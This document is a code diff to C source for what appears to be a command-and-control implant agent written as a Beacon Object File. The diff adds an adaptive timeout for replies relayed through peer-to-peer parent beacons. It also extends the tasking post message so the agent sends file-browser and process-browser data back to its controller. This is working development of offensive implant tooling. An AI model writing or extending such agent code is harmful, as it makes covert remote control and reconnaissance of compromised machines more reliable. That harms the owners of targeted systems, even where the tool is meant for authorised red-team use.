@@ -5,6 +5,7 @@
 
 WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
+WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(void);
 
 WINBASEAPI size_t MSVCRT$strlen(const char *str);
 WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);
@@ -84,7 +85,16 @@ static BOOL agent_send(AgentState *state, const char *uuid, const char *binary_m
 		if (p2p_send(&state->p2p_peer, encoded_msg) == 0) {
 			// A reply lost in a deep relay must time out instead of wedging the
 			// agent forever; the caller reports the failure and keeps going.
-			char *reply = p2p_recv_timeout(&state->p2p_peer, P2P_RECV_TIMEOUT_SEC);
+			// The deadline must exceed the round trip, which is governed by the
+			// uplink parent's beacon cadence (each hop relays on its own
+			// interval), so we adapt to the largest round trip we've seen.
+			unsigned long t0 = KERNEL32$GetTickCount();
+			int recv_timeout = 300; /* generous first-exchange default */
+			if (state->p2p_rtt_ms > 0) {
+				recv_timeout = (int)(state->p2p_rtt_ms * 3 / 1000) + 30;
+				if (recv_timeout < 90) { recv_timeout = 90; }
+			}
+			char *reply = p2p_recv_timeout(&state->p2p_peer, recv_timeout);
 			if (reply != NULL) {
 				size_t rlen = MSVCRT$strlen(reply);
 				response->body = MSVCRT$malloc(rlen + 1);
@@ -98,6 +108,15 @@ static BOOL agent_send(AgentState *state, const char *uuid, const char *binary_m
 					ok = TRUE;
 				}
 				KERNEL32$VirtualFree(reply, 0, MEM_RELEASE);
+			}
+			/* Learn the round trip ONLY from successful exchanges. A timeout
+			 * reflects a lost reply, not the true RTT — using it would make the
+			 * deadline grow with every failure. */
+			if (ok) {
+				unsigned long elapsed = KERNEL32$GetTickCount() - t0;
+				if (elapsed > state->p2p_rtt_ms) {
+					state->p2p_rtt_ms = elapsed; /* remember the slowest round trip */
+				}
 			}
 		}
 		KERNEL32$VirtualFree(encoded_msg, 0, MEM_RELEASE);
@@ -564,13 +583,24 @@ BOOL perform_tasking(AgentState *state, TaskingReply *reply) {
 
 char *generate_post_message(TaskPostRequest *post, int *msg_len) {
 	// Allocate space and construct the serialized post_response message.
-	// 1 type byte + 3 NUL-terminated strings + 1 completed flag.
+	// 1 type byte + 3 NUL-terminated strings + 1 completed flag
+	// + 1 flags byte + optional NUL-terminated structured blobs.
 	
 	int len = 1;
 	len += MSVCRT$strlen(post->task_id) + 1;
 	len += MSVCRT$strlen(post->task_output) + 1;
 	len += MSVCRT$strlen(post->task_status) + 1;
 	len += 1; // completed flag
+	len += 1; // flags byte
+	int flags = 0;
+	if (post->file_browser_blob != NULL && post->file_browser_blob[0] != '\0') {
+		flags |= 1;
+		len += MSVCRT$strlen(post->file_browser_blob) + 1;
+	}
+	if (post->process_browser_blob != NULL && post->process_browser_blob[0] != '\0') {
+		flags |= 2;
+		len += MSVCRT$strlen(post->process_browser_blob) + 1;
+	}
 	int offset = 0;
 	
 	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
@@ -585,6 +615,15 @@ char *generate_post_message(TaskPostRequest *post, int *msg_len) {
 	
 	// 1 byte indicating whether this response completes the task (1) or not (0).
 	pack_char(msg, &offset, post->completed ? 1 : 0);
+
+	// Flags + optional structured payloads.
+	pack_char(msg, &offset, flags);
+	if (flags & 1) {
+		pack_string(msg, &offset, post->file_browser_blob);
+	}
+	if (flags & 2) {
+		pack_string(msg, &offset, post->process_browser_blob);
+	}
 	
 	*msg_len = offset;
 	return msg;
@@ -597,7 +636,7 @@ void free_post_request(TaskPostRequest *request) {
 	if (request->task_status != NULL) { KERNEL32$VirtualFree(request->task_status, 0, MEM_RELEASE); }
 }
 
-BOOL perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status, BOOL completed) {
+BOOL perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status, BOOL completed, char *file_browser_blob, char *process_browser_blob) {
 	// Generate post payload.
 	TaskPostRequest post = { 0 };
 	post.callback_uuid = clone_str(state->params.callback_uuid);
@@ -605,6 +644,8 @@ BOOL perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char 
 	post.task_output = output;
 	post.task_status = status;
 	post.completed = completed;
+	post.file_browser_blob = file_browser_blob;
+	post.process_browser_blob = process_browser_blob;
 	int msg_len = 0;
 	char *msg = generate_post_message(&post, &msg_len);
 	
